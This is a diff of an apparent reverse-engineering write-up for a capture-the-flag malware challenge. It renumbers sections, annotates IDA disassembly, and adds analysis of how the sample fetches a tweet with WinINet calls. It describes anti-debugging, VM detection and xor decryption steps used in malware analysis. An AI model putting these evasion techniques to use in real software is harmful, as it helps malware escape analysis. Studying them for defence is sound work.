-</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
@@ -2470,7 +2544,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;Such fire. Much burn. Wow.&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="function-6---ntglobalflag">Function 6 - NtGlobalFlag</h3>
+<h3 id="function-7---ntglobalflag">Function 7 - NtGlobalFlag</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2483,7 +2557,9 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">9</span>
 <span class="line-number">10</span>
 <span class="line-number">11</span>
-</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
@@ -2513,7 +2589,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;Feel the sting of the monarch!&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="function-7---sands-of-time">Function 7 - Sands of Time</h3>
+<h3 id="function-8---sands-of-time">Function 8 - Sands of Time</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2526,7 +2602,9 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">9</span>
 <span class="line-number">10</span>
 <span class="line-number">11</span>
-</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
@@ -2581,7 +2659,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;1337&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="function-8---backdogeexe">Function 8 - Backdoge.exe</h3>
+<h3 id="function-9---backdogeexe">Function 9 - Backdoge.exe</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2594,7 +2672,9 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">9</span>
 <span class="line-number">10</span>
 <span class="line-number">11</span>
-</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
@@ -2628,7 +2708,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;LETS GO SHOPPING&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="function-9---dogecoincom-ip-check">Function 9 - Dogecoin.com IP Check</h3>
+<h3 id="function-10---dogecoincom-ip-check">Function 10 - Dogecoin.com IP Check</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2641,7 +2721,9 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">9</span>
 <span class="line-number">10</span>
 <span class="line-number">11</span>
-</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
@@ -2694,7 +2776,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;SHOPPING IS HARD&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="function-10---hour-of-the-wolf">Function 10 - Hour of the Wolf</h3>
+<h3 id="function-11---hour-of-the-wolf">Function 11 - Hour of the Wolf</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2707,7 +2789,9 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">9</span>
 <span class="line-number">10</span>
 <span class="line-number">11</span>
-</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">OutputDebugString</span>
@@ -2762,7 +2846,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\x07\x77</span><span class="s">&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="interlude---fullpath-xor">Interlude - Fullpath xor</h3>
+<h3 id="interlude---12---fullpath-xor">Interlude - 12 - Fullpath xor</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2829,7 +2913,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span> <span class="n">fullpath</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="function-11---internet-rootz">Function 11 - Internet Rootz</h3>
+<h3 id="function-13---internet-rootz">Function 13 - Internet Rootz</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2860,7 +2944,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;192.203.230.10&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="function-12---jackrat">Function 12 - jackRAT</h3>
+<h3 id="function-14---jackrat">Function 14 - jackRAT</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2939,7 +3023,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 
 <p>We see <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx">InternetOpen</a> called. This function initialises the WinINet functions. Agent name is <code>ZBot</code> which is an alternate name for the <code>Zeus</code> trojan horse. Access type is <code>INTERNET_OPEN_TYPE_DIRECT</code> which means direct access without the use of any proxies. If a NULL handle is returned then function will exit (line 28). If not it will jump to <code>loc_4018E5</code> (line 21).</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>loc 4018E5 </span></figcaption>
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>loc 4018E5 - InternetOpenUrl </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
 <span class="line-number">3</span>
@@ -2982,11 +3066,11 @@ We have already seen the transitive property of xor so we can calculate the corr
 </pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E5</span> <span class="nv">loc_4018E5</span><span class="p">:</span>             <span class="c1">; dwContext</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E5</span> <span class="nv">push</span>    <span class="nb">ebx</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">E6</span> <span class="nv">push</span>    <span class="mh">400100h</span>         <span class="c1">; dwFlags</span>
-</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">EB</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; dwHeadersLength</span>
-</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">EC</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; lpszHeaders</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">EB</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; dwHeadersLength - 0x00</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">EC</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; lpszHeaders - 0x00</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">ED</span> <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">szUrl</span><span class="p">]</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F0</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpszUrl</span>
-</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F1</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hInternet</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F1</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hInternet - Handle from previous InternetOpen</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F2</span> <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">szUrl</span><span class="p">],</span> <span class="mh">740068h</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F9</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_78</span><span class="p">],</span> <span class="mh">700074h</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401900</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_74</span><span class="p">],</span> <span class="mh">3A0073h</span>
@@ -3013,17 +3097,608 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401993</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_20</span><span class="p">],</span> <span class="mh">310038h</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">0040199</span><span class="nf">A</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_1C</span><span class="p">],</span> <span class="mh">360031h</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">A1</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_18</span><span class="p">],</span> <span class="mh">300036h</span>
-</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">A8</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_14</span><span class="p">],</span> <span class="mh">38h</span>
-</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">AF</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">InternetOpenUrlW</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">A8</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_14</span><span class="p">],</span> <span class="mh">38h</span>   <span class="c1">; https://twitter.com/FireEye/status/484033515538116608</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">AF</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">InternetOpenUrlW</span> <span class="c1">; open URL</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">B5</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hInternet</span><span class="p">],</span> <span class="nb">eax</span>
-</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">BB</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>
-</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">BD</span> <span class="nv">jz</span>      <span class="nv">loc_4018D4</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">BB</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; ebx == 0x00 - check if eax is zero</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">BD</span> <span class="nv">jz</span>      <span class="nv">loc_4018D4</span>      <span class="c1">; if (eax == 0 ) jump to loc_4018D4 (return immedi</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098%28v=vs.85%29.aspx">InternetOpenUrl</a> opens a handle to a resource. <code>dwFlags</code> is set to <code>0x00400100</code>. I could not find the exact meaning of this flag value. However, <code>INTERNET_FLAG_KEEP_CONNECTION</code> is <code>0x00400000</code> according to <a href="http://cpansearch.perl.org/src/JDB/Win32-Internet-0.087/WININET.H">this page</a>.</p>
+<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098%28v=vs.85%29.aspx">InternetOpenUrl</a> opens a handle to a resource. <code>dwFlags</code> is set to <code>0x00400100</code>. I could not find the exact meaning of this flag value. However, according to <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa383661%28v=vs.85%29.aspx">this page</a> it could be the <code>AND</code> of two flags (does it work that way?):</p>
 
-<p>(IsDebuggerPresent, Current hour,  Internet connection check, IP address decryption, Twitter keyword decryption)</p>
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>0x00400100 flag </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">INTERNET_FLAG_KEEP_CONNECTION: 0x00400000
+</span><span class="line">Uses keep-alive semantics, if available, for the connection. 
+</span><span class="line">
+</span><span class="line">INTERNET_FLAG_PRAGMA_NOCACHE: 0x00000100
+</span><span class="line">Forces the request to be resolved by the origin server,</span></code></pre></td></tr></table></div></figure></notextile></div>
 
+<p>Lines 9 to 35 are saving the URL, we know what it is without even looking at it, we have seen it it Wireshark before. The URL is <code>https://twitter.com/FireEye/status/484033515538116608</code>.</p>
+
+<p><img src="http://parsiya.net/images/2014/flare/7-2.jpg" alt="Fireeye tweet" title="Fireeye tweet" /></p>
+
+<p>Line 37 sees return value which is a “valid handle to the URL if the connection is successfully established, or NULL if the connection fails” and saves it. Then it is checked for being NULL, if so we will jump to <code>loc_4018D4</code> and function returns immediately. If we have a handle to the tweet, execution continues.</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>loc 4019D6 - InternetReadFile </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D6</span> <span class="nv">loc_4019D6</span><span class="p">:</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D6</span> <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">DC</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpdwNumberOfBytesRead - Pointer to variable that will hold number of bytes read</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="kd">DD</span> <span class="nv">push</span>    <span class="mh">1000h</span>           <span class="c1">; dwNumberOfBytesToRead - Number of bytes to read 0x1000 == 4096</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">E2</span> <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Buffer</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">E8</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpBuffer - Buffer to hold the retrieved data</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">E9</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hFile - Handle from previous InternetOpenUrl call</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">EA</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">InternetReadFile</span> <span class="c1">; Reading the first 4KBs of the tweet</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">F0</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">F6</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="nb">edx</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">F9</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; size_t</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">FA</span> <span class="nv">call</span>    <span class="nv">??2@YAPAXI@Z</span>    <span class="c1">; operator new(uint)</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">FF</span> <span class="nv">push</span>    <span class="nb">edi</span>             <span class="c1">; size_t</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A00</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A02</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; void *</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A03</span> <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; void *</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A04</span> <span class="nv">call</span>    <span class="nv">_memcpy</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A09</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A0F</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; size_t</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A10</span> <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Buffer</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A16</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; void *</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A17</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">edi</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A1A</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; void *</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A1B</span> <span class="nv">call</span>    <span class="nv">_memcpy</span>         <span class="c1">; Copy retrieved data to [eax]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A20</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; void *</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A21</span> <span class="nv">call</span>    <span class="nv">??3@YAXPAX@Z</span>    <span class="c1">; operator delete(void *)</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A26</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A2C</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">20h</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A2F</span> <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A31</span> <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esi</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A33</span> <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>         <span class="c1">; Keep reading until NumberofBytesRead is zero</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A35</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_4019D0</span> <span class="c1">; if (NumberofBytesRead !=0 ) jump to loc_4019D0 to continue reading</span>
+</span><span class="line">
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D0</span> <span class="nv">loc_4019D0</span><span class="p">:</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D0</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hInternet</span><span class="p">]</span> <span class="c1">; Back to the top to continue reading</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385103%28v=vs.85%29.aspx">InternetReadFile</a> retrieves the tweet. A buffer is created to hold the retrieved data. Documentation says “[a] normal read retrieves the specified dwNumberOfBytesToRead for each call to InternetReadFile until the end of the file is reached. To ensure all data is retrieved, an application must continue to call the InternetReadFile function until the function returns TRUE and the lpdwNumberOfBytesRead parameter equals zero.” This is happening in lines 31-35. We keep reading until <code>NumberofBytesRead</code> is zero.</p>
+
+<p>After we are done, jump at line 32 is not taken and we land here:</p>
